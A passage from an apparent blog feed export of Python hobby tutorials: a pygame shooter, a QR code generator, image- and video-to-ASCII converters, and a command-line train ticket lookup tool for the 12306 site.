&#x654C;&#x673A;&#x4E0E;&#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x78B0;&#x649E;&#x6548;&#x679C;&#x5904;&#x7406; if pygame.sprite.collide_circle(enemy, player): enemies_down.add(enemy) enemies1.remove(enemy) player.is_hit = True break #4. &#x79FB;&#x52A8;&#x51FA;&#x5C4F;&#x5E55;&#x540E;&#x5220;&#x9664;&#x98DE;&#x673A; if enemy.rect.top &lt; 0: enemies1.remove(enemy) #&#x654C;&#x673A;&#x88AB;&#x5B50;&#x5F39;&#x51FB;&#x4E2D;&#x6548;&#x679C;&#x5904;&#x7406; # &#x5C06;&#x88AB;&#x51FB;&#x4E2D;&#x7684;&#x654C;&#x673A;&#x5BF9;&#x8C61;&#x6DFB;&#x52A0;&#x5230;&#x51FB;&#x6BC1;&#x654C;&#x673A; Group &#x4E2D;&#xFF0C;&#x7528;&#x6765;&#x6E32;&#x67D3;&#x51FB;&#x6BC1;&#x52A8;&#x753B; enemies1_down = pygame.sprite.groupcollide(enemies1, player.bullets, 1, 1) for enemy_down in enemies1_down: enemies_down.add(enemy_down) # &#x7ED8;&#x5236;&#x80CC;&#x666F; screen.fill(0) screen.blit(background, (0, 0)) # &#x7ED8;&#x5236;&#x73A9;&#x5BB6;&#x98DE;&#x673A; if not player.is_hit: screen.blit(player.image[player.img_index], player.rect) # &#x66F4;&#x6362;&#x56FE;&#x7247;&#x7D22;&#x5F15;&#x4F7F;&#x98DE;&#x673A;&#x6709;&#x52A8;&#x753B;&#x6548;&#x679C; player.img_index = shoot_frequency // 8 else: # &#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x88AB;&#x51FB;&#x4E2D;&#x540E;&#x7684;&#x6548;&#x679C;&#x5904;&#x7406; player.img_index = player_down_index // 8 screen.blit(player.image[player.img_index], player.rect) player_down_index += 1 if player_down_index &gt; 47: # &#x51FB;&#x4E2D;&#x6548;&#x679C;&#x5904;&#x7406;&#x5B8C;&#x6210;&#x540E;&#x6E38;&#x620F;&#x7ED3;&#x675F; running = False # &#x654C;&#x673A;&#x88AB;&#x5B50;&#x5F39;&#x51FB;&#x4E2D;&#x6548;&#x679C;&#x663E;&#x793A; for enemy_down in enemies_down: if enemy_down.down_index == 0: pass if enemy_down.down_index &gt; 7: enemies_down.remove(enemy_down) score += 1000 continue screen.blit(enemy_down.down_imgs[enemy_down.down_index // 2], enemy_down.rect) enemy_down.down_index += 1 # &#x663E;&#x793A;&#x5B50;&#x5F39; player.bullets.draw(screen) # &#x663E;&#x793A;&#x654C;&#x673A; enemies1.draw(screen) # &#x7ED8;&#x5236;&#x5F97;&#x5206; score_font = pygame.font.Font(None, 36) score_text = score_font.render(str(score), True, (128, 128, 128)) text_rect = score_text.get_rect() text_rect.topleft = [10, 10] screen.blit(score_text, text_rect) # &#x66F4;&#x65B0;&#x5C4F;&#x5E55; pygame.display.update() # &#x5904;&#x7406;&#x6E38;&#x620F;&#x9000;&#x51FA; for event in pygame.event.get(): if event.type == pygame.QUIT: pygame.quit() exit() # &#x83B7;&#x53D6;&#x952E;&#x76D8;&#x4E8B;&#x4EF6;&#xFF08;&#x4E0A;&#x4E0B;&#x5DE6;&#x53F3;&#x6309;&#x952E;&#xFF09; key_pressed = pygame.key.get_pressed() # &#x5904;&#x7406;&#x952E;&#x76D8;&#x4E8B;&#x4EF6;&#xFF08;&#x79FB;&#x52A8;&#x98DE;&#x673A;&#x7684;&#x4F4D;&#x7F6E;&#xFF09; if key_pressed[K_w] or key_pressed[K_UP]: player.moveUp() if key_pressed[K_s] or key_pressed[K_DOWN]: player.moveDown() if key_pressed[K_a] or key_pressed[K_LEFT]: player.moveLeft() if key_pressed[K_d] or key_pressed[K_RIGHT]: player.moveRight()# &#x6E38;&#x620F; Game Over &#x540E;&#x663E;&#x793A;&#x6700;&#x7EC8;&#x5F97;&#x5206;font = pygame.font.Font(None, 48)text = font.render(&apos;Score: &apos;+ str(score), True, (255, 0, 0))text_rect = text.get_rect()text_rect.centerx = screen.get_rect().centerxtext_rect.centery = screen.get_rect().centery + 24screen.blit(game_over, (0, 0))screen.blit(text, text_rect)# &#x663E;&#x793A;&#x5F97;&#x5206;&#x5E76;&#x5904;&#x7406;&#x6E38;&#x620F;&#x9000;&#x51FA;while 1: for event in pygame.event.get(): if event.type == pygame.QUIT: pygame.quit() exit() pygame.display.update() document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
        <category>pygame</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pygame</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python generates a personalized QR code]]></title>
    <url>%2F2018%2F10%2F09%2FPython-generates-a-personalized-QR-code%2F</url>
    <content type="text"><![CDATA[img.py123456789101112131415161718192021222324&quot;&quot;&quot;Usage: python3 img.py [image_name] [save_name]Options: -h --help show this on screen.&quot;&quot;&quot;from MyQR import myqrimport argparseparser = argparse.ArgumentParser()parser.add_argument(&apos;image_name&apos;)parser.add_argument(&apos;save_name&apos;)args = parser.parse_args()img_name = args.file1save_name = args.file2myqr.run(words=&apos;https://www.shiyanlou.com&apos;, picture=img_name, save_name=save_name, colorized=True) &#x751F;&#x6210;&#x7684;&#x56FE;&#x7247;&#xFF1A; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 3 implements image to color characters]]></title>
    <url>%2F2018%2F10%2F08%2FPython-3-implements-image-to-color-characters%2F</url>
    <content type="text"><![CDATA[colors.py123456789101112131415161718192021222324252627282930313233343536# &#x989C;&#x8272;&#x6620;&#x5C04;def rgb(red, green, blue): return 16 + (red * 36) + (green * 6) + blue# &#x8BBE;&#x7F6E;&#x8F93;&#x51FA;&#x6837;&#x5F0F;def set_style(fg=None, bg=None, bold=None): # &#x5C06;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x4E3A;&#x7A7A; end=&apos;&apos; &#x6D88;&#x9664;&#x81EA;&#x52A8;&#x6362;&#x884C; print(_set_style(fg, bg, bold), end=&apos;&apos;)# &#x5B9E;&#x73B0;&#x8BBE;&#x7F6E;&#x8F93;&#x51FA;&#x6837;&#x5F0F;def _set_style(fg=None, bg=None, bold=&apos;&apos;): result = &apos;&apos; if fg: result += &apos;\x1b[38;5;%dm&apos; % fg if bg: result += &apos;\x1b[48;5;%dm&apos; % bg if bold: result += &apos;\x1b[1m&apos; return result# &#x91CD;&#x7F6E;&#x989C;&#x8272;def reset_color(): print(_reset_color(), end=&apos;&apos;)# &#x5B9E;&#x73B0;&#x91CD;&#x7F6E;&#x989C;&#x8272;def _reset_color(): return &apos;\x1b[0m&apos;# &#x6253;&#x5370;&#x5B57;&#x7B26;def print_color(*args, **kwargs): fg = kwargs.pop(&apos;fg&apos;, None) bg = kwargs.pop(&apos;bg&apos;, None) bold = kwargs.pop(&apos;bold&apos;, None) set_style(fg, bg, bold) print(*args, **kwargs) reset_color() i2a.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125&quot;&quot;&quot; ### #### ###### ### ### # ### ### ### ###### ### #### ### ## ### #### ### ## ### ########## ##### ###i2a creates ASCII art from images right on your terminal.Usage: i2a [options] [FILE]Options: -h --help Show this on screen. -v --version Show version. -c --colors Show colored output. -b --bold Output bold characters --contrast=&lt;factor&gt; Manually set contrast [default: 1.5]. --alt-chars Use an alternate set of characters.&quot;&quot;&quot;import subprocessfrom colors import *from PIL import Image, ImageEnhancefrom docopt import docopt__version__ = &apos;1.0&apos;_ASCII = &quot;@80GCLft1i;:,. &quot;_ASCII_2 = &quot;Q0RMNWBDHK@$U8&amp;AOkYbZGPXgE4dVhgSqm6pF523yfwCJ#TnuLjz7oeat1[]!?I}*{srlcxvi)&gt;&lt;\\)|\&quot;/+=^;,:&apos;_-`. &quot;# &#x56FE;&#x50CF;&#x8F6C;&#x5F69;&#x8272;&#x5B57;&#x7B26;&#x51FD;&#x6570;def display_output(arguments): global _ASCII if arguments[&apos;--alt-chars&apos;]: _ASCII = _ASCII_2 try: im = Image.open(arguments[&apos;FILE&apos;]) except: raise IOError(&apos;Unable to open the file&apos;) im = im.convert(&quot;RGBA&quot;) try: _HEIGHT, _WIDTH = map(int, subprocess.check_output([&apos;stty&apos;, &apos;size&apos;]).split()) except: _HEIGHT, _WIDTH = 50, 50 # &#x6309;&#x6BD4;&#x4F8B;&#x7F29;&#x653E;&#x56FE;&#x50CF; aspect_ratio = im.size[0] / im.size[1] scaled_height = _WIDTH / aspect_ratio scaled_width = _HEIGHT * aspect_ratio * 2 # &#x8BA1;&#x7B97;&#x8C03;&#x6574;&#x4E4B;&#x540E;&#x7684;&#x56FE;&#x50CF;&#x7684;&#x5BBD;&#x9AD8; width = scaled_width height = scaled_height if scaled_width &gt; _WIDTH: width = int(_WIDTH) height = int(scaled_height / 2) elif scaled_height &gt; _HEIGHT: width = int(scaled_width) height = int(_HEIGHT) # &#x5C06;&#x56FE;&#x50CF;&#x957F;&#x5BBD;&#x8F6C;&#x6362;&#x4E3A;&#x6307;&#x5B9A;&#x503C; # resample &#x53C2;&#x6570;&#x53EF;&#x9009;&#xFF0C;&#x6307;&#x5B9A;&#x4E86;&#x5728;&#x53D8;&#x6362;&#x56FE;&#x50CF;&#x5927;&#x5C0F;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x91C7;&#x6837;&#x65B9;&#x5F0F;&#xFF0C;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x8F6C;&#x53D8;&#x4E4B;&#x540E;&#x7684;&#x56FE;&#x50CF;&#x8D28;&#x91CF;&#xFF0C;&#x6211;&#x4EEC;&#x91C7;&#x7528; PIL.Image.ANTIALIAS &#x9009;&#x9879;&#x6307;&#x5B9A;&#x9AD8;&#x8D28;&#x91CF;&#x7684;&#x91C7;&#x6837;&#x6EE4;&#x6CE2;&#x5668;&#x3002; im = im.resize((width,height), resample=Image.ANTIALIAS) # &#x521B;&#x5EFA; PIL.ImageEnhance.Contrast &#x5BF9;&#x8C61;&#xFF0C;&#x7528;&#x4E8E;&#x8C03;&#x6574;&#x5BF9;&#x6BD4;&#x5EA6; enhancer = ImageEnhance.Contrast(im) im = enhancer.enhance(float(arguments[&apos;--contrast&apos;])) # &#x83B7;&#x53D6; im &#x7684;&#x56FE;&#x50CF;&#x6570;&#x636E; # &#x8FD4;&#x56DE;&#x503C;&#x4E3A; list &#x5BF9;&#x8C61; img = im.getdata() # &#x5C06;&#x56FE;&#x50CF;&#x8F6C;&#x6362;&#x4E3A;&#x7070;&#x9636;&#x56FE; im = im.convert(&apos;L&apos;) # &#x5B9A;&#x4E49;&#x524D;&#x666F;&#x8272;&#x4E0E;&#x80CC;&#x666F;&#x8272; bg = rgb(0, 0, 0) fg = rgb(5, 5, 5) # &#x662F;&#x5426;&#x52A0;&#x7C97;&#x663E;&#x793A;&#x5B57;&#x7B26; bold = None if arguments[&apos;--bold&apos;]: bold = True else: bold = False # &#x7528;&#x4E8E;&#x8BA1;&#x6570;&#x5F53;&#x524D;&#x5728;&#x7B2C;&#x51E0;&#x5217;&#x6253;&#x5370; row_len = 0 # &#x904D;&#x5386;&#x6BCF;&#x4E2A;&#x50CF;&#x7D20;&#x70B9; for (count, i) in enumerate(im.getdata()): # &#x5C06;&#x50CF;&#x7D20;&#x503C;&#x6620;&#x5C04;&#x5230;&#x76F8;&#x5E94;&#x7684;&#x5B57;&#x7B26; ascii_char = _ASCII[int((i / 255.0) * (len(_ASCII) - 1))] # &#x82E5;&#x8981;&#x6C42;&#x8F6C;&#x6210;&#x5F69;&#x8272;&#x5B57;&#x7B26; if arguments[&apos;--colors&apos;]: # &#x989C;&#x8272;&#x6620;&#x5C04; color = rgb(int((img[count][0] / 255.0) * 5), int((img[count][1] / 255.0) * 5),int((img[count][2] / 255.0) * 5)) # &#x80CC;&#x666F;&#x8272;&#x8BBE;&#x7F6E;&#x4E3A;&#x8BE5;&#x989C;&#x8272; bg = color # &#x524D;&#x666F;&#x8272;&#x7F6E;&#x4F4D;&#x9ED1;&#x8272; fg = rgb(0, 0, 0) # &#x6253;&#x5370;&#x5B57;&#x7B26; print_color(&apos; &apos;, end=&apos;&apos;, fg=fg, bg=bg, bold=bold) row_len += 1 # &#x5F53;&#x5217;&#x6570;&#x7B49;&#x4E8E;&#x7EC8;&#x7AEF;&#x5BBD;&#x7684;&#x65F6;&#x5019;&#x8FDB;&#x884C;&#x6362;&#x884C;&#xFF0C;&#x5E76;&#x5C06; row_len &#x91CD;&#x65B0;&#x7F6E; 1 if row_len == width: row_len = 0 print(&apos;&apos;)def main(): # &#x83B7;&#x53D6;&#x547D;&#x4EE4;&#x884C;&#x53C2;&#x6570;&#x89E3;&#x6790;&#x4E4B;&#x540E;&#x7684;&#x5B57;&#x5178; arguments = docopt(__doc__, version=__version__) # &#x82E5;&#x6CA1;&#x6709; FILE &#x53C2;&#x6570;&#xFF0C;&#x5219;&#x6253;&#x5370;&#x5E2E;&#x52A9;&#x4FE1;&#x606F; # &#x82E5;&#x6709;&#x5219;&#x8FDB;&#x884C;&#x8F6C;&#x6362;&#x5DE5;&#x4F5C; if arguments[&apos;FILE&apos;]: display_output(arguments) else: print(__doc__)if __name__ == &apos;__main__&apos;: main() &#x8FD0;&#x884C;&#x7ED3;&#x679C;&#xFF1A; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python implementation of train ticket inquiry tool]]></title>
    <url>%2F2018%2F10%2F07%2FPython-implementation-of-train-ticket-inquiry-tool%2F</url>
    <content type="text"><![CDATA[Code:ticket.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495# coding: utf-8&quot;&quot;&quot;&#x547D;&#x4EE4;&#x884C;&#x706B;&#x8F66;&#x7968;&#x67E5;&#x770B;&#x5668;Usage: tickets [-gdtkz] &lt;from&gt; &lt;to&gt; &lt;date&gt;Options: -h,--help &#x663E;&#x793A;&#x5E2E;&#x52A9;&#x83DC;&#x5355; -g &#x9AD8;&#x94C1; -d &#x52A8;&#x8F66; -t &#x7279;&#x5FEB; -k &#x5FEB;&#x901F; -z &#x76F4;&#x8FBE;Example: tickets &#x5317;&#x4EAC; &#x4E0A;&#x6D77; 2016-10-10 tickets -dg &#x6210;&#x90FD; &#x5357;&#x4EAC; 2016-10-10&quot;&quot;&quot;from docopt import docoptimport requestsfrom stations import stationsfrom prettytable import PrettyTablefrom colorama import init, Foreinit()class TrainsCollection: header = &apos;&#x8F66;&#x6B21; &#x8F66;&#x7AD9; &#x65F6;&#x95F4; &#x5386;&#x65F6; &#x4E00;&#x7B49; &#x4E8C;&#x7B49; &#x9AD8;&#x7EA7;&#x8F6F;&#x5367; &#x8F6F;&#x5367; &#x786C;&#x5367; &#x786C;&#x5EA7; &#x65E0;&#x5EA7;&apos;.split() def __init__(self, available_trains,available_place, options): &quot;&quot;&quot;&#x67E5;&#x8BE2;&#x7684;&#x706B;&#x8F66;&#x73ED;&#x6B21;&#x96C6;&#x5408; :param available_trains: &#x4E00;&#x4E2A;&#x5217;&#x8868;, &#x5305;&#x542B;&#x53EF;&#x83B7;&#x5F97;&#x7684;&#x706B;&#x8F66;&#x73ED;&#x6B21;, &#x6BCF;&#x4E2A; &#x706B;&#x8F66;&#x73ED;&#x6B21;&#x662F;&#x4E00;&#x4E2A;&#x5B57;&#x5178; :param options: &#x67E5;&#x8BE2;&#x7684;&#x9009;&#x9879;, &#x5982;&#x9AD8;&#x94C1;, &#x52A8;&#x8F66;, etc... &quot;&quot;&quot; self.available_trains = available_trains self.available_place = available_place self.options = options @property def trains(self): for raw_train in self.available_trains: raw_train_list = raw_train.split(&apos;|&apos;) train_no = raw_train_list[3] initial = train_no[0].lower() duration = raw_train_list[10] if not self.options or initial in self.options: train = [ train_no,# train number &apos;\n&apos;.join([Fore.LIGHTGREEN_EX + self.available_place[raw_train_list[6]] + Fore.RESET, Fore.LIGHTRED_EX + self.available_place[raw_train_list[7]] + Fore.RESET]), &apos;\n&apos;.join([Fore.LIGHTGREEN_EX + raw_train_list[8] + Fore.RESET, Fore.LIGHTRED_EX + raw_train_list[9] + Fore.RESET]), duration,#&#x65F6;&#x957F; raw_train_list[-6] if raw_train_list[-6] else &apos;--&apos;,# &#x4E00;&#x7B49; raw_train_list[-7] if raw_train_list[-7] else &apos;--&apos;,# &#x4E8C;&#x7B49; raw_train_list[-15] if raw_train_list[-15] else &apos;--&apos;,# &#x9AD8;&#x7EA7;&#x8F6F;&#x5367; raw_train_list[-8] if raw_train_list[-8] else &apos;--&apos;,# &#x8F6F;&#x5367; raw_train_list[-14] if raw_train_list[-14] else &apos;--&apos;,#&#x786C;&#x5367; raw_train_list[-11] if raw_train_list[-11] else &apos;--&apos;,#&#x786C;&#x5EA7; raw_train_list[-9] if raw_train_list[-9] else &apos;--&apos;,#&#x65E0;&#x5EA7; ] yield train def pretty_print(self): pt = PrettyTable() pt._set_field_names(self.header) for train in self.trains: pt.add_row(train) print(pt)def cli(): &quot;&quot;&quot;command-line interface&quot;&quot;&quot; arguments = docopt(__doc__) from_station = stations.get(arguments[&apos;&lt;from&gt;&apos;]) to_station = stations.get(arguments[&apos;&lt;to&gt;&apos;]) date = arguments[&apos;&lt;date&gt;&apos;] url = (&apos;https://kyfw.12306.cn/otn/leftTicket/queryA?&apos; &apos;leftTicketDTO.train_date={}&amp;&apos; &apos;leftTicketDTO.from_station={}&amp;leftTicketDTO.to_station={}&amp;purpose_codes=ADULT&apos;).format( date, from_station, to_station ) r = requests.get(url, verify=True) # print(r.json()) available_trains = r.json()[&apos;data&apos;][&apos;result&apos;] available_place = r.json()[&apos;data&apos;][&apos;map&apos;] options = &apos;&apos;.join([ key for key, value in arguments.items() if value is True ]) TrainsCollection(available_trains, available_place, options).pretty_print()if __name__ == &apos;__main__&apos;: cli() parse_station.py12345678import reimport requestsfrom pprint import pprinturl = &apos;https://kyfw.12306.cn/otn/resources/js/framework/station_name.js?station_version=1.9069&apos;response = requests.get(url, verify=False)stations = re.findall(u&apos;([\u4e00-\u9fa5]+)\|([A-Z]+)&apos;, response.text)pprint(dict(stations), indent=4) &#x8FD0;&#x884C;&#x7ED3;&#x679C;&#xFF1A; &#x89E3;&#x6790;&#x6570;&#x636E;&#x8FD9;&#x90E8;&#x5206;&#x7B2C;&#x4E00;&#x6B21;&#x63A5;&#x89E6;&#x611F;&#x89C9;&#x6709;&#x70B9;&#x9EBB;&#x70E6;&#xFF1A;12345678910111213141516171819202122232425262728293031@propertydef trains(self): for raw_train in self.available_trains: raw_train_list = raw_train.split(&apos;|&apos;) train_no = raw_train_list[3] initial = train_no[0].lower() duration = raw_train_list[10] if not self.options or initial in self.options: train = [ train_no,# train number &apos;\n&apos;.join([Fore.LIGHTGREEN_EX + self.available_place[raw_train_list[6]] + Fore.RESET, Fore.LIGHTRED_EX + self.available_place[raw_train_list[7]] + Fore.RESET]), &apos;\n&apos;.join([Fore.LIGHTGREEN_EX + raw_train_list[8] + Fore.RESET, Fore.LIGHTRED_EX + raw_train_list[9] + Fore.RESET]), duration,#&#x65F6;&#x957F; raw_train_list[-6] if raw_train_list[-6] else &apos;--&apos;,# &#x4E00;&#x7B49; raw_train_list[-7] if raw_train_list[-7] else &apos;--&apos;,# &#x4E8C;&#x7B49; raw_train_list[-15] if raw_train_list[-15] else &apos;--&apos;,# &#x9AD8;&#x7EA7;&#x8F6F;&#x5367; raw_train_list[-8] if raw_train_list[-8] else &apos;--&apos;,# &#x8F6F;&#x5367; raw_train_list[-14] if raw_train_list[-14] else &apos;--&apos;,#&#x786C;&#x5367; raw_train_list[-11] if raw_train_list[-11] else &apos;--&apos;,#&#x786C;&#x5EA7; raw_train_list[-9] if raw_train_list[-9] else &apos;--&apos;,#&#x65E0;&#x5EA7; ] yield traindef pretty_print(self): pt = PrettyTable() pt._set_field_names(self.header) for train in self.trains: pt.add_row(train) print(pt) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python3 & OpenCV video character animation]]></title>
    <url>%2F2018%2F10%2F07%2FPython3-OpenCV-video-character-animation%2F</url>
    <content type="text"><![CDATA[code:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177import sysimport osimport timeimport threadingimport termiosimport ttyimport cv2import pyprindclass CharFrame: ascii_char = &quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1{}[]?-_+~&lt;&gt;i!lI;:,\&quot;^`&apos;. &quot; # &#x50CF;&#x7D20;&#x6620;&#x5C04;&#x5230;&#x5B57;&#x7B26; def pixelToChar(self, luminance): return self.ascii_char[int(luminance/256*len(self.ascii_char))] # &#x5C06;&#x666E;&#x901A;&#x5E27;&#x8F6C;&#x4E3A; ASCII &#x5B57;&#x7B26;&#x5E27; def convert(self, img, limitSize=-1, fill=False, wrap=False): if limitSize != -1 and (img.shape[0] &gt; limitSize[1] or img.shape[1] &gt; limitSize[0]): img = cv2.resize(img, limitSize, interpolation=cv2.INTER_AREA) ascii_frame = &apos;&apos; blank = &apos;&apos; if fill: blank += &apos; &apos;*(limitSize[0]-img.shape[1]) if wrap: blank += &apos;\n&apos; for i in range(img.shape[0]): for j in range(img.shape[1]): ascii_frame += self.pixelToChar(img[i,j]) ascii_frame += blank return ascii_frameclass I2Char(CharFrame): result = None def __init__(self, path, limitSize=-1, fill=False, wrap=False): self.genCharImage(path, limitSize, fill, wrap) def genCharImage(self, path, limitSize=-1, fill=False, wrap=False): img = cv2.imread(path, cv2.IMREAD_GRAYSCALE) if img is None: return self.result = self.convert(img, limitSize, fill, wrap) def show(self, stream = 2): if self.result is None: return if stream == 1 and os.isatty(sys.stdout.fileno()): self.streamOut = sys.stdout.write self.streamFlush = sys.stdout.flush elif stream == 2 and os.isatty(sys.stderr.fileno()): self.streamOut = sys.stderr.write self.streamFlush = sys.stderr.flush elif hasattr(stream, &apos;write&apos;): self.streamOut = stream.write self.streamFlush = stream.flush self.streamOut(self.result) self.streamFlush() self.streamOut(&apos;\n&apos;)class V2Char(CharFrame): charVideo = [] timeInterval = 0.033 def __init__(self, path): if path.endswith(&apos;txt&apos;): self.load(path) else: self.genCharVideo(path) def genCharVideo(self, filepath): self.charVideo = [] cap = cv2.VideoCapture(filepath) self.timeInterval = round(1/cap.get(5), 3) nf = int(cap.get(7)) print(&apos;Generate char video, please wait...&apos;) for i in pyprind.prog_bar(range(nf)): rawFrame = cv2.cvtColor(cap.read()[1], cv2.COLOR_BGR2GRAY) frame = self.convert(rawFrame, os.get_terminal_size(), fill=True) self.charVideo.append(frame) cap.release() def export(self, filepath): if not self.charVideo: return with open(filepath,&apos;w&apos;) as f: for frame in self.charVideo: # &#x52A0;&#x4E00;&#x4E2A;&#x6362;&#x884C;&#x7B26;&#x7528;&#x4EE5;&#x5206;&#x9694;&#x6BCF;&#x4E00;&#x5E27; f.write(frame + &apos;\n&apos;) def load(self, filepath): self.charVideo = [] # &#x4E00;&#x884C;&#x5373;&#x4E3A;&#x4E00;&#x5E27; for i in open(filepath): self.charVideo.append(i[:-1]) def play(self, stream = 1): # Bug: # &#x5149;&#x6807;&#x5B9A;&#x4F4D;&#x8F6C;&#x4E49;&#x7F16;&#x7801;&#x4E0D;&#x517C;&#x5BB9; Windows if not self.charVideo: return if stream == 1 and os.isatty(sys.stdout.fileno()): self.streamOut = sys.stdout.write self.streamFlush = sys.stdout.flush elif stream == 2 and os.isatty(sys.stderr.fileno()): self.streamOut = sys.stderr.write self.streamFlush = sys.stderr.flush elif hasattr(stream, &apos;write&apos;): self.streamOut = stream.write self.streamFlush = stream.flush old_settings = None breakflag = None # &#x83B7;&#x5F97;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x7684;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26; fd = sys.stdin.fileno() def getChar(): nonlocal breakflag nonlocal old_settings # &#x4FDD;&#x5B58;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x7684;&#x5C5E;&#x6027; old_settings = termios.tcgetattr(fd) # &#x8BBE;&#x7F6E;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x4E3A;&#x539F;&#x59CB;&#x6A21;&#x5F0F; tty.setraw(sys.stdin.fileno()) # &#x8BFB;&#x53D6;&#x4E00;&#x4E2A;&#x5B57;&#x7B26; ch = sys.stdin.read(1) breakflag = True if ch else False # &#x521B;&#x5EFA;&#x7EBF;&#x7A0B; getchar = threading.Thread(target=getChar) # &#x8BBE;&#x7F6E;&#x4E3A;&#x5B88;&#x62A4;&#x7EBF;&#x7A0B; getchar.daemon = True # &#x542F;&#x52A8;&#x5B88;&#x62A4;&#x7EBF;&#x7A0B; getchar.start() # &#x8F93;&#x51FA;&#x7684;&#x5B57;&#x7B26;&#x753B;&#x884C;&#x6570; rows = len(self.charVideo[0])//os.get_terminal_size()[0] for frame in self.charVideo: # &#x63A5;&#x6536;&#x5230;&#x8F93;&#x5165;&#x5219;&#x9000;&#x51FA;&#x5FAA;&#x73AF; if breakflag is True: break self.streamOut(frame) self.streamFlush() time.sleep(self.timeInterval) # &#x5171; rows &#x884C;&#xFF0C;&#x5149;&#x6807;&#x4E0A;&#x79FB; rows-1 &#x884C;&#x56DE;&#x5230;&#x5F00;&#x59CB;&#x5904; self.streamOut(&apos;\033[{}A\r&apos;.format(rows-1)) # &#x6062;&#x590D;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x4E3A;&#x539F;&#x6765;&#x7684;&#x5C5E;&#x6027; termios.tcsetattr(fd, termios.TCSADRAIN, old_settings) # &#x5149;&#x6807;&#x4E0B;&#x79FB; rows-1 &#x884C;&#x5230;&#x6700;&#x540E;&#x4E00;&#x884C;&#xFF0C;&#x6E05;&#x7A7A;&#x6700;&#x540E;&#x4E00;&#x884C; self.streamOut(&apos;\033[{}B\033[K&apos;.format(rows-1)) # &#x6E05;&#x7A7A;&#x6700;&#x540E;&#x4E00;&#x5E27;&#x7684;&#x6240;&#x6709;&#x884C;&#xFF08;&#x4ECE;&#x5012;&#x6570;&#x7B2C;&#x4E8C;&#x884C;&#x8D77;&#xFF09; for i in range(rows-1): # &#x5149;&#x6807;&#x4E0A;&#x79FB;&#x4E00;&#x884C; self.streamOut(&apos;\033[1A&apos;) # &#x6E05;&#x7A7A;&#x5149;&#x6807;&#x6240;&#x5728;&#x884C; self.streamOut(&apos;\r\033[K&apos;) info = &apos;User interrupt!\n&apos; if breakflag else &apos;Finished!\n&apos; self.streamOut(info)if __name__ == &apos;__main__&apos;: import argparse # &#x8BBE;&#x7F6E;&#x547D;&#x4EE4;&#x884C;&#x53C2;&#x6570; parser = argparse.ArgumentParser() parser.add_argument(&apos;file&apos;, help=&apos;Video file or charvideo file&apos;) parser.add_argument(&apos;-e&apos;, &apos;--export&apos;, nargs = &apos;?&apos;, const = &apos;charvideo.txt&apos;, help=&apos;Export charvideo file&apos;) # &#x83B7;&#x53D6;&#x53C2;&#x6570; args = parser.parse_args() v2char = V2Char(args.file) if args.export: v2char.export(args.export) v2char.play() document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C language quickly realizes Gomoku]]></title>
    <url>%2F2018%2F10%2F07%2FC-language-quickly-realizes-Gomoku%2F</url>
